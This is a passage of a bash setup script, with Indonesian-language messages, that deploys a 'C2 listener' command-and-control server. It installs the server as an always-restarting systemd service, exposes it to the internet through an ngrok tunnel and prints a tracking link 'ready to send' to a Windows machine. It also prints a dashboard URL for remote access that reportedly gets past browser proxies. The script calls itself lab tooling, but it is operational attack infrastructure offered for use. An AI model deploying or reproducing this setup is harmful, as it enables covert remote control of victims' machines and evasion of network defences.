    if [ "$LISTENER_MODE" = "systemd" ]; then
        echo " [*] Memasang systemd service (auto-restart, nyala otomatis saat boot)..."
        local PY; PY=$(command -v python3)
        local CWD; CWD=$(pwd)
        local SU="$USER"; [ -n "$SUDO_USER" ] && SU="$SUDO_USER"
        local UL=""; [ "$SU" != "root" ] && UL="User=${SU}"
        local NG; NG=$(command -v ngrok)

        $SUDO pkill -f "$SCRIPT_NAME" 2>/dev/null || true
        $SUDO pkill -f "ngrok http" 2>/dev/null || true
        sleep 1

        $SUDO tee /etc/systemd/system/c2-listener.service > /dev/null <<EOSVC
[Unit]
Description=C2 Listener
After=network.target

[Service]
${UL}
WorkingDirectory=${CWD}
ExecStart=${PY} -u ${CWD}/${SCRIPT_NAME}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOSVC

        if [ "$DO_NGROK" = "1" ]; then
            $SUDO tee /etc/systemd/system/c2-ngrok.service > /dev/null <<EOSVC
[Unit]
Description=C2 ngrok tunnel
After=network.target

[Service]
${UL}
ExecStart=${NG} http ${PORT} --log=stdout
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOSVC
            $SUDO systemctl enable c2-ngrok > /dev/null 2>&1 || true
        else
            $SUDO systemctl disable c2-ngrok > /dev/null 2>&1 || true
        fi

        $SUDO systemctl daemon-reload
        $SUDO systemctl enable c2-listener > /dev/null 2>&1 || true
        $SUDO systemctl restart c2-listener 2>/dev/null || true
        [ "$DO_NGROK" = "1" ] && $SUDO systemctl restart c2-ngrok 2>/dev/null || true
        sleep 3
        echo " [+] systemd c2-listener : $($SUDO systemctl is-active c2-listener 2>/dev/null || echo unknown)"
        if [ "$DO_NGROK" = "1" ]; then
            echo " [+] systemd c2-ngrok    : $($SUDO systemctl is-active c2-ngrok 2>/dev/null || echo unknown)"
        fi
        echo "     Kelola: sudo systemctl status c2-listener | restart | stop"
        echo "     Log   : journalctl -u c2-listener -f"
    else
        echo " [*] Menghentikan proses lama (jika ada)..."
        pkill -f "$SCRIPT_NAME" 2>/dev/null || true
        pkill -f "ngrok http" 2>/dev/null || true
        sleep 1

        echo " [*] Starting C2 listener on port $PORT in background..."
        nohup python3 -u "$SCRIPT_NAME" >> "$SERVER_LOG" 2>&1 &
        LISTENER_PID=$!
        sleep 2
        if kill -0 "$LISTENER_PID" 2>/dev/null; then
            echo " [+] Listener berjalan (PID $LISTENER_PID)."
            echo " [+] Log server : $SERVER_LOG"
            echo " [+] Live log   : tail -f $SERVER_LOG"
            echo " [+] Stop       : pkill -f $SCRIPT_NAME"
        else
            echo " [!] Listener gagal start, cek log: $SERVER_LOG"
            tail -5 "$SERVER_LOG" 2>/dev/null || true
        fi

        if [ "$DO_NGROK" = "1" ]; then
            echo " [*] Starting ngrok tunnel -> localhost:$PORT ..."
            nohup ngrok http "$PORT" --log=stdout > ngrok.log 2>&1 &
            NGROK_PID=$!
        fi
    fi
}

fetch_ngrok_url() {
    NGROK_URL=""
    sleep 4
    for i in 1 2 3 4 5 6; do
        NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | python3 -c "import sys,json;print(json.load(sys.stdin)['tunnels'][0]['public_url'])" 2>/dev/null || true)
        if [ -n "$NGROK_URL" ]; then
            break
        fi
        sleep 2
    done
    if [ -n "$NGROK_URL" ]; then
        echo " [+] Ngrok tunnel berjalan: $NGROK_URL"
    else
        echo " [!] Ngrok tidak menghasilkan public URL."
        if [ -f ngrok.log ]; then
            echo "     Error terakhir:"
            tail -3 ngrok.log 2>/dev/null || true
        fi
        echo "     Untuk systemd, cek: journalctl -u c2-ngrok -n 20"
    fi
}

echo " [*] Detecting server IP..."
TS_IP=""
detect_ip() {
    if command -v tailscale > /dev/null 2>&1; then
        TS_IP=$(tailscale ip -4 2>/dev/null | awk '{print $1}')
    fi
    if command -v hostname > /dev/null 2>&1; then
        local ip
        ip=$(hostname -I 2>/dev/null | awk '{print $1}')
        if [ -n "$ip" ] && [ "$ip" != "127.0.0.1" ]; then
            echo "$ip"
            return
        fi
    fi
    if command -v ipconfig > /dev/null 2>&1; then
        local ip
        ip=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
        if [ -n "$ip" ]; then
            echo "$ip"
            return
        fi
    fi
    echo "127.0.0.1"
}
SERVER_IP=$(detect_ip)

echo "=================================================================="
echo " Setup Complete!"
echo ""
echo " [1] Tracking link - READY TO SEND to Windows lab machine:"
echo "     http://${SERVER_IP}:${PORT}/?id=lab-1"
echo "     (opsional: ganti 'lab-1' dengan nama unik mesin, misal ?id=win-lab-2)"
echo ""
echo " [2] Dashboard (monitoring + Remote Access mesin lab dalam satu halaman):"
echo "     http://${SERVER_IP}:${PORT}/dashboard"
if [ -n "$TS_IP" ]; then
    echo "     (via Tailscale: http://${TS_IP}:${PORT}/dashboard)"
fi
echo ""
echo " [3] Restart semua service (systemd):  sudo systemctl restart c2-listener c2-ngrok"
echo "     (tanpa systemd: python3 -u $SCRIPT_NAME)"
echo ""
echo " [4] Jika server adalah VM cloud, buka port $PORT di security group."
echo "=================================================================="

NGROK_URL=""
if ensure_ngrok; then
    start_services "1"
    fetch_ngrok_url
else
    echo " [*] Listener tetap jalan (tanpa ngrok) sampai token diberikan..."
    start_services "0"
fi

echo ""
echo "=================================================================="
echo " URL AKHIR"
if [ -n "$NGROK_URL" ]; then
echo " [NGROK] Dashboard : $NGROK_URL/dashboard"
echo " [NGROK] Link lab  : $NGROK_URL/?id=lab-1"
echo "         (dashboard berisi monitoring + remote access; bisa tembus proxy browser)"
fi
echo " [LAN]  Dashboard : http://${SERVER_IP}:${PORT}/dashboard"
echo " [LAN]  Link lab  : http://${SERVER_IP}:${PORT}/?id=lab-1"
echo "=================================================================="
